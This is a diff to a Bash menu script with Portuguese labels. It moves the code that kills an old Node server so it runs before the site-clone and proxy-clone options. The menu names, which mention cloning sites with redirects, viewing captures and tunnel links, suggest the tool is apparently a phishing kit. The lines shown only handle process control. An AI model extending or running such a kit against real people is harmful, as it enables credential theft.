@@ -357,22 +357,8 @@ ENDSPA
     fi
     echo -e "  ${GREEN}============================${NC}"
 
-    # Iniciar servidor
-    echo -e "${YELLOW}[...] Iniciando servidor...${NC}"
-    pkill -9 -f "node.*server.js" 2>/dev/null
-    sleep 1
-    if command -v fuser &>/dev/null; then
-        fuser -k "$port/tcp" 2>/dev/null
-    elif command -v lsof &>/dev/null; then
-        local old_pid=$(lsof -ti :$port 2>/dev/null)
-        [ -n "$old_pid" ] && kill -9 $old_pid 2>/dev/null
-    elif command -v netstat &>/dev/null; then
-        local old_pid=$(netstat -tlnp 2>/dev/null | grep ":$port " | grep -oE '[0-9]+/node' | cut -d/ -f1)
-        [ -n "$old_pid" ] && kill -9 $old_pid 2>/dev/null
-    fi
-    sleep 1
-
-    cd "$SCRIPT_DIR"
+    # Iniciar servidor (só matar o antigo se o download + substituição deram certo)
+    local my_ip=$(get_my_ip)
     REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
     local pid=$!
     echo "$pid" > "$SCRIPT_DIR/.server.pid"
@@ -390,6 +376,15 @@ ENDSPA
     echo ""
     echo -e "${YELLOW}Pressione Enter para volver ao menu...${NC}"
     read dummy
+}
+
+# =============================================
+# KILL OLD SERVER (before clone)
+# =============================================
+kill_old_server() {
+    pkill -9 -f "node.*server.js" 2>/dev/null
+    rm -f "$SCRIPT_DIR/.server.pid"
+    sleep 2
 }
 
 # =============================================
@@ -868,6 +863,7 @@ while true; do
             read PROXY_CHOICE
             echo "$PROXY_CHOICE" | grep -qi "^[sy]" && local_proxy="y"
 
+            kill_old_server
             clone_site "$URL" "$REDIR" "$PT" "$local_proxy"
             ;;
         2) view_captures ;;
@@ -877,7 +873,10 @@ while true; do
         6) show_tunnel_link ;;
         7) show_status ;;
         8) stop_all; read ;;
-        9) do_proxy_clone ;;
+        9)
+            kill_old_server
+            do_proxy_clone
+            ;;
         0) stop_all; exit 0 ;;
         *) echo -e "${RED}Inválido!${NC}" ;;
     esac
